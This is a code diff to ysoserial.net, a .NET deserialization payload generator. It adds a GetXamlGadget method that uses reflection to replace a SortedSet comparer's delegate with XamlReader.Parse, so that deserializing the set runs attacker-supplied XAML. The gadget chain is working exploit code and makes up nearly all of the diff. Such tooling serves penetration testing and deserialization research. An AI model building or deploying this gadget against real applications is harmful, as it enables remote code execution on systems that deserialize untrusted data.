@@ -398,7 +398,9 @@ namespace ysoserial.Generators
                 }
             }
             else
+            {
                 return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
+            }
         }
 
         /* this can be used easily by the plugins as well */
@@ -442,6 +444,22 @@ namespace ysoserial.Generators
 
             return set;
         }
-
+        
+        public static object GetXamlGadget(string xaml_payload)
+        {
+            Delegate da = new Comparison<string>(String.Compare);
+            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
+            IComparer<string> comp = Comparer<string>.Create(d);
+            SortedSet<string> set = new SortedSet<string>(comp);
+            set.Add(xaml_payload);
+            set.Add("");
+            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
+            object[] invoke_list = d.GetInvocationList();
+            // We use XamlReader.Parse() to trigger the xaml execution
+            invoke_list[1] = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
+            fi.SetValue(d, invoke_list);
+            return set;
+        }
+        
     }
 }
